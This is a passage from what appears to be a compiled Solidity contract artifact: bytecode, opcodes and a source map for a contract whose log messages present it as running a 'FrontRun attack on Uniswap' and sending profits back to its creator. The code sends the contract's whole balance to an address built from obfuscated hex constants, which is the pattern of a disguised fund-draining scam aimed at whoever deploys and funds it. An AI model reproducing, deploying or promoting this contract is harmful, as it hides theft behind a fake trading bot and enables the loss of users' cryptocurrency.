PUSH2 0x542 DUP6 DUP6 PUSH2 0xA76 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x58A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7EC JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x5D2 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5F4 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x645 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x655 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6EF JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x693 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6A3 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6EE JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6E1 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6ED JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x72D JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x73D JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7D7 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x77B JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x78B JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7D6 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7C9 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7D5 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x5B6 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x46DDF SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x833 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x82B JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x811 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x84C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x87F JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8FE JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x89A JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x8A6 DUP4 PUSH2 0xBF2 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x8B7 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8F0 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x888 JUMP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 EQ ISZERO PUSH2 0x95E JUMPI PUSH1 0x60 PUSH2 0x94F PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x3 DUP2 EQ ISZERO PUSH2 0x9B7 JUMPI PUSH1 0x60 PUSH2 0x9A8 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x2 DUP2 EQ ISZERO PUSH2 0xA10 JUMPI PUSH1 0x60 PUSH2 0xA01 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x1 DUP2 EQ ISZERO PUSH2 0xA69 JUMPI PUSH1 0x60 PUSH2 0xA5A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0xA9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0xAD1 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xB4F JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xAF6 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xB13 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xAE1 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xBC2 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xB69 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xB86 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xB54 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x287EF SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x8BC81 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x4D003 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xC0C JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xC41 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xC96 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xC59 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xC91 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xC96 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E672046726F6E7452756E2061747461636B20 PUSH16 0x6E20556E69737761702E205468697320 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C6520706C656173 PUSH6 0x20776169742E 0x2E 0x2E LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC5 SWAP7 PUSH29 0xD6E269ED28BAE2282A8BA18EFAD2D4AD27DF048E6B552EB8191A513AB3 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "428:17885:0:-:0;;;583:151;5:9:-1;2:2;;;27:1;24;17:12;2:2;583:151:0;;;;;;;;;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;583:151:0;;;;;;;;;;;;;19:11:-1;14:3;11:20;8:2;;;44:1;41;34:12;8:2;71:11;66:3;62:21;55:28;;123:4;118:3;114:14;159:9;141:16;138:31;135:2;;;182:1;179;172:12;135:2;219:3;213:10;330:9;325:1;311:12;307:20;289:16;285:43;282:58;261:11;247:12;244:29;233:115;230:2;;;361:1;358;351:12;230:2;384:12;379:3;372:25;420:4;415:3;411:14;404:21;;0:432;;583:151:0;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;583:151:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;19:11:-1;14:3;11:20;8:2;;;44:1;41;34:12;8:2;71:11;66:3;62:21;55:28;;123:4;118:3;114:14;159:9;141:16;138:31;135:2;;;182:1;179;172:12;135:2;219:3;213:10;330:9;325:1;311:12;307:20;289:16;285:43;282:58;261:11;247:12;244:29;233:115;230:2;;;361:1;358;351:12;230:2;384:12;379:3;372:25;420:4;415:3;411:14;404:21;;0:432;;583:151:0;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;583:151:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;679:10;667:9;:22;;;;;;;;;;;;:::i;:::-;;714:12;700:11;:26;;;;;;;;;;;;:::i;:::-;;583:151;;428:17885;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100435760003560e01c80636c02a9311461004f5780637b61c320146100df578063be9a65551461016f578063d4e93292146101795761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100eb57600080fd5b506100f4610221565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610134578082015181840152602081019050610119565b50505050905090810190601f1680156101615780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101776102bf565b005b61018161035a565b005b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102b75780601f1061028c576101008083540402835291602001916102b7565b820191906000526020600020905b81548152906001019060200180831161029a57829003601f168201915b505050505081565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526048815260200180610ccf6048913960600191505060405180910390a16103126103f5565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610357573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610c9c6033913960400191505060405180910390a16103ad61040c565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103f2573d6000803e3d6000fd5b50565b6000610407610402610423565b6105a0565b905090565b600061041e610419610423565b6105a0565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107f9565b610804565b610a76565b9050600061fbb290506000610487610bd1565b905060006202e8d59050600061049b610bdc565b905060006203dd44905060006104af610be7565b905060006201ddae905060606104cd896104c88a610804565b610a76565b905060606104eb6104dd89610804565b6104e689610804565b610a76565b905060606105096104fb88610804565b61050488610804565b610a76565b9050606061052761051987610804565b61052287610804565b610a76565b905060606105476105388686610a76565b6105428585610a76565b610a76565b9050606061058a6040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525083610a76565b9050809e50505050505050505050505050505090565b6000606082905060008090506000806000600290505b602a8110156107ec57610100840293508481815181106105d257fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106105f457fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610645575060668373ffffffffffffffffffffffffffffffffffffffff1611155b15610655576057830392506106ef565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610693575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156106a3576037830392506106ee565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106e1575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106ed576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff161015801561072d575060668273ffffffffffffffffffffffffffffffffffffffff1611155b1561073d576057820391506107d7565b60418273ffffffffffffffffffffffffffffffffffffffff161015801561077b575060468273ffffffffffffffffffffffffffffffffffffffff1611155b1561078b576037820391506107d6565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156107c9575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107d5576030820391505b5b5b816010840201840193506002810190506105b6565b5082945050505050919050565b600062046ddf905090565b6060600080905060008390505b600081146108335781806001019250506010818161082b57fe5b049050610811565b60608267ffffffffffffffff8111801561084c57600080fd5b506040519080825280601f01601f19166020018201604052801561087f5781602001600182028036833780820191505090505b50905060008090505b838110156108fe576010868161089a57fe5b0692506108a683610bf2565b82600183870303815181106108b757fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108f057fe5b049550806001019050610888565b50600081519050600481141561095e57606061094f6040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b60038114156109b75760606109a86040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b6002811415610a10576060610a016040518060400160405280600381526020017f303030000000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b6001811415610a69576060610a5a6040518060400160405280600481526020017f303030300000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b819450505050505b919050565b60608083905060608390506060815183510167ffffffffffffffff81118015610a9e57600080fd5b506040519080825280601f01601f191660200182016040528015610ad15781602001600182028036833780820191505090505b5090506060819050600080600091505b8551821015610b4f57858281518110610af657fe5b602001015160f81c60f81b838280600101935081518110610b1357fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610ae1565b600091505b8451821015610bc257848281518110610b6957fe5b602001015160f81c60f81b838280600101935081518110610b8657fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610b54565b82965050505050505092915050565b6000620287ef905090565b60006208bc81905090565b60006204d003905090565b60008160ff16600011158015610c0c575060098260ff1611155b15610c4157817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610c96565b8160ff16600a11158015610c595750600f8260ff1611155b15610c9157600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610c96565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e672046726f6e7452756e2061747461636b206f6e20556e69737761702e20546869732063616e2074616b652061207768696c6520706c6561736520776169742e2e2ea2646970667358221220c5967cd6e269ed28bae2282a8ba18efad2d4ad27df048e6b552eb8191a513ab364736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x16F JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x179 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF4 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x134 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x177 PUSH2 0x2BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x181 PUSH2 0x35A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2B7 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x28C JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2B7 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x29A JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x48 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xCCF PUSH1 0x48 SWAP2 CODECOPY PUSH1 0x60 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x312 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x357 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xC9C PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x3AD PUSH2 0x40C 